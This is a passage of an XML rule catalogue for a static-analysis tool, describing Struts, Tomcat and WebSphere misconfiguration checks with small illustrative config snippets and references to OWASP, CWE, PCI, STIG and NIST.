																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 13, CWE ID 260, CWE ID 555</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_duplicate_form_bean</key>
		<internalKey>Environment/Struts Misconfiguration/Duplicate Form Bean
		</internalKey>
		<name>Struts Misconfiguration: Duplicate Form Bean</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple <code>form-bean</code> entries with the same name exist. Duplicate <code>form-bean</code> names often indicate left over debug code or a typographical error.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Duplicate <code>form-bean</code> names serve no purpose since only the last entry will be registered when the same name is used in multiple <code>&lt;form-bean&gt;</code> tags.<br><br><b>Example 1:</b> The following configuration has two <code>form-bean</code> entries with the same name.<br><pre><br>&lt;form-beans&gt;<br>  &lt;form-bean name="loginForm" type="org.apache.struts.validator.DynaValidatorForm"&gt;<br>    &lt;form-property name="name" type="java.lang.String" /&gt;<br>    &lt;form-property name="password" type="java.lang.String" /&gt;<br>  &lt;/form-bean&gt;<br>  &lt;form-bean name="loginForm" type="org.apache.struts.validator.DynaActionForm"&gt;<br>    &lt;form-property name="favoriteColor" type="java.lang.String" /&gt;<br>  &lt;/form-bean&gt;<br>&lt;/form-beans&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 694</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_invalid_path</key>
		<internalKey>Environment/Struts Misconfiguration/Invalid Path
		</internalKey>
		<name>Struts Misconfiguration: Invalid Path</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Invalid path entries prevent Struts from locating the correct resource to service requests.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts uses the <code>path</code> attribute to locate the resource necessary to handle a request. Since the path is a module-relative location, it is an error if it does not begin with a "/" character.<br><br><b>Example 1:</b> The following configuration contains an empty path.<br><pre><br>&lt;global-exceptions&gt;<br>  &lt;exception key="global.error.invalidLogin" path="" scope="request" type="InvalidLoginException" /&gt;<br>&lt;/global-exceptions&gt;<br></pre><br><br><b>Example 2:</b> The following configuration uses a path that does not start with a "/" character.<br><pre><br>&lt;global-forwards&gt;<br>  &lt;forward name="login" path="Login.jsp" /&gt;<br>&lt;/global-forwards&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3]  <em>Chuck Caveness, Brian Keeton</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[5]  <em>struts-config_1_3.dtd</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_action_input</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Action Input
		</internalKey>
		<name>Struts Misconfiguration: Missing Action Input</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  It is an error to omit the <code>input</code> attribute for named Struts actions that can return validation errors..
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The struts specification requires an <code>input</code> attribute whenever a named action returns validation errors[2]. The <code>input</code> attribute specifies the page used to display error messages when validation errors occur.<br><b>Example 1:</b> The following configuration defines a named validating action, but does not specify an <code>input</code> attribute.<br><pre><br>&lt;action-mappings&gt;<br>  &lt;action   path="/Login"<br>            type="com.LoginAction"<br>            name="LoginForm"<br>            scope="request"<br>            validate="true" /&gt;<br>&lt;/action-mappings&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[4]  <em>struts-config_1_3.dtd</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_exception_type</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Exception
			Type
		</internalKey>
		<name>Struts Misconfiguration: Missing Exception Type</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An <code>&lt;exception&gt;</code> tag that does not contain a <code>type</code> attribute will not be used.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>&lt;exception&gt;</code> tag requires that an exception type be defined. A missing or empty <code>type</code> attribute is indicative of either a superfluous exception handler or an accidental omission. If a developer intended to handle an exception, but forgot to define the exception type, then the application might leak sensitive information about the system.<br><b>Example 1:</b> The following configuration omits the type from the <code>&lt;exception&gt;</code> tag.<br><pre><br>  &lt;global-exceptions&gt;<br>    &lt;exception<br>      key="error.key"<br>      handler="com.mybank.ExceptionHandler"/&gt;<br>  &lt;/global-exceptions&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[4]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10]  <em>Building Controller Components</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 248</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[17]  <em>struts-config_1_3.dtd</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_form_bean</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Form Bean
		</internalKey>
		<name>Struts Misconfiguration: Missing Form Bean</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Struts <code>action</code> that points to a nonexistent <code>form-bean</code> will not be mapped correctly.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts uses <code>form-bean</code> entries to map HTML forms to actions. If the <code>name</code> attribute in an <code>&lt;action&gt;</code> tag does not correspond with the name of a <code>form-bean</code>, the action cannot be mapped and indicates either a superfluous definition or a typographical error.<br><br><b>Example 1:</b> The following configuration does not contain a mapping for <code>bean2</code>.<br><pre><br>&lt;form-beans&gt;<br>  &lt;form-bean name="bean1" type="coreservlets.UserFormBean" /&gt;<br>&lt;/form-beans&gt;<br><br>&lt;action-mappings&gt;<br>  &lt;action path="/actions/register1" type="coreservlets.RegisterAction1" name="bean1" scope="request" /&gt;<br>  &lt;action path="/actions/register2" type="coreservlets.RegisterAction2" name="bean2" scope="request" /&gt;<br>&lt;/action-mappings&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_form_bean_name</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Form Bean
			Name
		</internalKey>
		<name>Struts Misconfiguration: Missing Form Bean Name</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A <code>form-bean</code> without a <code>name</code> attribute will not be used.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts uses the <code>form-bean</code> name to map HTML forms to actions. If a <code>form-bean</code> does not have a name, it cannot be mapped to an action and indicates either a superfluous definition or an accidentally omitted bean.<br>Here is a proper form-bean example:<br><b>Example 1:</b> The following <code>form-bean</code> has an empty <code>name</code> attribute.<br><pre><br>&lt;form-beans&gt;<br>  &lt;form-bean name="" type="org.apache.struts.validator.DynaValidatorForm"&gt;<br>    &lt;form-property name="name" type="java.lang.String" /&gt;<br>    &lt;form-property name="password" type="java.lang.String" /&gt;<br>  &lt;/form-bean&gt;<br>&lt;/form-beans&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_form_bean_type</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Form Bean
			Type
		</internalKey>
		<name>Struts Misconfiguration: Missing Form Bean Type</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A <code>form-bean</code> without a <code>type</code> attribute will not be mapped correctly.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts uses <code>form-bean</code> entries to map HTML forms to actions. If a <code>form-bean</code> does not have a type, it cannot be mapped to an action.<br><b>Example 1:</b> The following <code>form-bean</code> has an empty <code>type</code> attribute.<br><pre><br>&lt;form-beans&gt;<br>  &lt;form-bean name="loginForm" type=""&gt;<br>    &lt;form-property name="name" type="java.lang.String" /&gt;<br>    &lt;form-property name="password" type="java.lang.String" /&gt;<br>  &lt;/form-bean&gt;<br>&lt;/form-beans&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_form_property_type
		</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Form Property
			Type
		</internalKey>
		<name>Struts Misconfiguration: Missing Form Property Type</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  It is an error to define a <code>form-property</code> without a <code>type</code> type attribute.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts requires <code>&lt;form-property&gt;</code> tags to include a <code>type</code> attribute. Struts will throw an exception when processing a form that defines a <code>form-property</code> with no type.<br><br><b>Example 1:</b> The following configuration omits a type for the <code>name</code> property.<br><pre><br>&lt;form-bean name="loginForm" type="org.apache.struts.validator.DynaValidatorForm"&gt;<br>  &lt;form-property name="name" /&gt;<br>  &lt;form-property name="password" type="java.lang.String" /&gt;<br>&lt;/form-bean&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_forward_name</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Forward Name
		</internalKey>
		<name>Struts Misconfiguration: Missing Forward Name</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A <code>&lt;forward&gt;</code> tag with a missing <code>name</code> attribute often indicates leftover debug code or a typographical error.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A <code>&lt;forward&gt;</code> tag must have <code>name</code> and <code>path</code> attributes. Without a name, the <code>forward</code> will never be used.<br><br><b>Example 1:</b> The following <code>&lt;forward&gt;</code> tag has an empty <code>name</code> attribute.<br><pre><br>    &lt;forward name="" path="/results.jsp"/&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_struts_misconfiguration_missing_forward_path</key>
		<internalKey>Environment/Struts Misconfiguration/Missing Forward Path
		</internalKey>
		<name>Struts Misconfiguration: Missing Forward Path</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A <code>&lt;forward&gt;</code> tag with a missing <code>path</code> attribute often indicates leftover debug code or a typographical error.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A <code>&lt;forward&gt;</code> tag must have <code>name</code> and <code>path</code> attributes. It is an error to omit a path or to specify a blank path. Furthermore, all paths must start with the "/" character.<br><br><b>Example 1:</b> The following <code>&lt;forward&gt;</code> tag has a missing <code>path</code> attribute.<br><pre><br>    &lt;forward name="success" /&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_tomcat_configuration_insecure_transport</key>
		<internalKey>Environment/Tomcat Configuration/Insecure Transport
		</internalKey>
		<name>Tomcat Configuration: Insecure Transport</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program transits information over insecure HTTP connections.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programs deployed outside an enterprise's network infrastructure lose the internal guarantees of data transmission security. An attacker residing on a shared network may be able to snoop unencrypted traffic.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 5</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[19]  <em>SSL Configuration HOW-TO</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_misconfiguration_missing_nonce</key>
		<internalKey>Environment/WebSphere Misconfiguration/Missing Nonce
		</internalKey>
		<name>WebSphere Misconfiguration: Missing Nonce</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A SOAP message with a timestamp that does not expire is vulnerable to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. When a nonce is combined with timestamp (or expiration), each message is unique and is only valid for a certain amount of time, thus thwarting any attempt to retransmit an old message.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[6] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[11]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[12]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_misconfiguration_servlets_served_by_class_name
		</key>
		<internalKey>Environment/WebSphere Misconfiguration/Servlets Served By
			Class Name
		</internalKey>
		<name>WebSphere Misconfiguration: Servlets Served By Class Name</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application is configured to allow WebSphere to serve Servlets by their class names.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Allowing Servlets to be served by their class name allows any attacker who knows a Servlet's name to invoke it directly, even when it is not mapped in the application's deployment descriptor.<br><br>For example, consider an application that contains a Servlet named <code>com.ibm.websphere.samples.MyServlet</code>. When <code>serveServletsByClassnameEnabled</code> in <code>ibm-web-ext.xmi</code> (for WAS V6 and earlier) or <code>enable-serving-servlets-by-class-name</code> in <code>ibm-web-ext.xml</code> (from WAS V7 onwards) is set to <code>true</code>, it is possible to call the servlet by requesting:<br><code>http://www.example.com/SomeContextPath/servlet/com.ibm.websphere.samples.MyServlet</code>.<br><br>Worse, depending on the server's classloader structure, an attacker may be able to invoke Servlets from other applications hosted in the same WebSphere instance.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[17] Keys Botzum <em>WebSphere Application Server V6 advanced security hardening -- Part 1</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_inbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Inbound WS-Security Not Enabled
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Inbound WS-Security
			Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Service providers that don't use WS-Security make it hard to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an enhancement to SOAP that provides end-to-end message integrity and confidential regardless of the transport protocol. When WS-Security is not used, message rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and places it in the message.<br><br> The absence of an <code>&lt;securityRequestConsumerServiceConfig&gt;</code> tag in the IBM WebSphere WS-Security server deployment descriptor extension file indicates that inbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
